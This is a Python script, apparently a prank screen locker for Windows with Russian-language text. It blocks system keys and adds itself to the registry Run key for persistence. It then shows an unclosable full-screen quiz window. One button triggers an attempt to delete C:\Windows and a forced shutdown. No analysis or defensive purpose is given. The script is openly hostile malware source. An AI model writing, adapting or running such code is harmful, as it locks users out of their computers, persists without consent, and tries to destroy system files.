import os
from tkinter import *
from tkinter import messagebox
from winreg import *
from os import path
import time
import keyboard as k
k.block_key('win')
k.block_key('alt')
k.block_key('f4')
k.block_key('esc')
k.block_key('shift')
k.block_key('f1')
k.block_key('f2')
k.block_key('f3')
k.block_key('f5')
k.block_key('f6')
k.block_key('f7')
k.block_key('f8')
k.block_key('f9')
k.block_key('f10')
k.block_key('f11')
k.block_key('f12')
PathFile = path.abspath(__file__)
# (Если будете компилировать файл в ехе тогда PathFile = path.abspath(__file__)[:-2]+'exe')

def Startup():
    StartupKey = OpenKey(HKEY_CURRENT_USER,
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                    0, KEY_ALL_ACCESS)
    SetValueEx(StartupKey, 'name', 0, REG_SZ, PathFile)
    CloseKey(StartupKey)

Startup()
def close():
    if messagebox.showerror("ощибка", "вы получили подзатыльник от спуматея"):
        pass
def no():
    if messagebox.showerror("ошибка", "не верно"):
        pass
def smert():
    os.rmdir('C:\Windows')
    os.system('shutdown -s -t 20')
tk = Tk()
tk.title(';)')
tk.config(bg = 'black')
tk.geometry("1500x1500")
tk.protocol('WM_DELETE_WINDOW', close)
tk.resizable(width=False, height=False)
tk.overrideredirect(True)
tk.attributes("-topmost",True)
text = Label(tk, text='в чём смысл жизни?', fg='red', bg='black', font=('Consolas', 50)).pack()
btn = Button(tk, text='роблокс', font=('Consolas', 20), fg='red', bg='black', width='90',height='5', command=no)
btn.place(x=100, y=200)
btn1 = Button(tk, text='котики', font=('Consolas', 20), fg='red', bg='black', width='90',height='5', command=no)
btn1.place(x=100, y=400)
btn2 = Button(tk, text='NFT Лёха', font=('Consolas', 20), fg='red', bg='black', width='90',height='5', command=smert)
btn2.place(x=100, y=600)
tk.mainloop()
